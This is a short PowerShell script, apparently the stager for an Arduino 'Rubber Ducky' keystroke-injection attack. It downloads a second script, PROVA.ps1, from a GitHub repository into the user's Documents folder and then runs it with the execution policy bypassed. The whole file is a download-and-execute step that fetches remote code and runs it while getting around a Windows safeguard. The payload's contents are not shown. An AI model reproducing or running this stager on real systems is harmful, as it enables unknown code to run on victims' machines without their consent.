$documentsPath = [System.Environment]::GetFolderPath('MyDocuments')

$githubUrl = "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/PROVA.ps1"

$destinationFile = "$documentsPath\PROVA.ps1"

Invoke-WebRequest -Uri $githubUrl -OutFile $destinationFile

powershell -ExecutionPolicy Bypass -File $destinationFile
